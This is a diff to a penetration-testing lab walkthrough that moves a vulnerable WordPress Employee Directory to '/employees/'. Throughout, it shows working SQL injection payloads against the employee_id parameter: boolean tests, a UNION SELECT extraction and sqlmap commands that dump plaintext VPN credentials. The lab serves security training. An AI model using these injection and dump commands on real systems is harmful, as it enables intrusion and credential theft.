@@ -120,23 +120,24 @@ gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
 
 **What you're doing:** Brute-forcing common directory names to find hidden content.
 
-**Look for:** WordPress directories like `/wp-admin/`, `/wp-content/`, and `/wp-includes/`. The Employee Directory is a WordPress page.
+**Expected results:** You should find several interesting directories:
+- `/wp-admin/` - WordPress admin panel
+- `/wp-content/` - WordPress content directory
+- `/wp-includes/` - WordPress core files
+- `/employees/` - **This is our target!** An Employee Directory page
 
-### 2.3 Finding the Employee Directory
+### 2.3 Exploring the Employee Directory
 
-The Employee Directory is a WordPress page. You can find it by:
+Navigate to the Employee Directory you discovered:
 
 ```bash
-# Check the WordPress site for pages
-curl -s "http://172.16.0.100/" | grep -i "employee"
+# Open in browser or use curl
+curl -s "http://172.16.0.100/employees/" | head -100
 ```
 
-Or browse to the site and look for links. The Employee Directory is at:
-```
-http://172.16.0.100/?page_id=4
-```
+Or browse to: `http://172.16.0.100/employees/`
 
-You'll see a table of employees with a search box, and links to view individual employee details.
+You'll see a table of employees with a search box, and links to view individual employee details. Click on an employee name to see their detail page - notice the URL changes to include `?employee_id=1`.
 
 ### 2.4 Testing for SQL Injection
 
@@ -148,13 +149,13 @@ Let's test the `employee_id` parameter - it's a numeric field which is often eas
 
 ```bash
 # Normal request - shows employee details
-curl -s "http://172.16.0.100/?page_id=4&employee_id=1" | grep -i "john\|smith"
+curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -i "john\|smith"
 
 # Test with a simple boolean injection
-curl -s "http://172.16.0.100/?page_id=4&employee_id=1 AND 1=1" | grep -i "john"
+curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=1" | grep -i "john"
 
 # This should return nothing (false condition)
-curl -s "http://172.16.0.100/?page_id=4&employee_id=1 AND 1=2" | grep -i "john"
+curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=2" | grep -i "john"
 ```
 
 **Understanding the attack:**
@@ -168,7 +169,7 @@ Now let's use sqlmap to automate the extraction:
 
 ```bash
 # Let sqlmap identify the vulnerability on employee_id parameter
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --batch
 ```
 
 **What `-p employee_id` does:** Tells sqlmap to focus on the employee_id parameter.
@@ -177,12 +178,12 @@ Once confirmed, let's enumerate the database:
 
 ```bash
 # List all databases
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --dbs --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --dbs --batch
 ```
 
 ```bash
 # List tables in the WordPress database
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress --tables --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress --tables --batch
 ```
 
 **Expected result:** You should see a table called `wp_acme_employees`.
@@ -191,7 +192,7 @@ sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordp
 
 ```bash
 # Dump the employee table
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
 ```
 
 **CRITICAL FINDING:** The output reveals VPN credentials stored in plaintext:
@@ -473,7 +474,7 @@ Here's the complete attack chain you executed:
        └── Found webserver at 172.16.0.100 (ports 22, 80)
 
 2. WEB APPLICATION ATTACK
-   └── Discovered WordPress Employee Directory (?page_id=4)
+   └── Gobuster discovered /employees/ directory
        └── SQL Injection in employee_id parameter
            └── Extracted plaintext VPN credentials:
                - jsmith / Summer2024
@@ -545,10 +546,10 @@ you could also use svc_backup's DCSync rights to extract password hashes.
 Instead of using sqlmap, try to extract data manually using UNION-based injection:
 ```bash
 # Find the number of columns (try increasing until no error)
-curl "http://172.16.0.100/?page_id=4&employee_id=1 ORDER BY 10-- -"
+curl "http://172.16.0.100/employees/?employee_id=1 ORDER BY 10-- -"
 
 # Extract data with UNION
-curl "http://172.16.0.100/?page_id=4&employee_id=-1 UNION SELECT 1,2,3,vpn_username,vpn_password,6,7,8,9,10 FROM wp_acme_employees-- -"
+curl "http://172.16.0.100/employees/?employee_id=-1 UNION SELECT 1,2,3,vpn_username,vpn_password,6,7,8,9,10 FROM wp_acme_employees-- -"
 ```
 
 ### Exercise 2: Password Cracking
@@ -584,9 +585,9 @@ nmap -sn 172.16.2.0/24                    # Host discovery (internal segment)
 nmap -sV -sC <IP>                         # Service scan with scripts
 
 # SQL Injection (this lab)
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --dbs --batch
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress --tables --batch
-sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --dbs --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress --tables --batch
+sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
 
 # SMB with smbclient
 smbclient -L //<IP> -U '<user>%<pass>'              # List shares
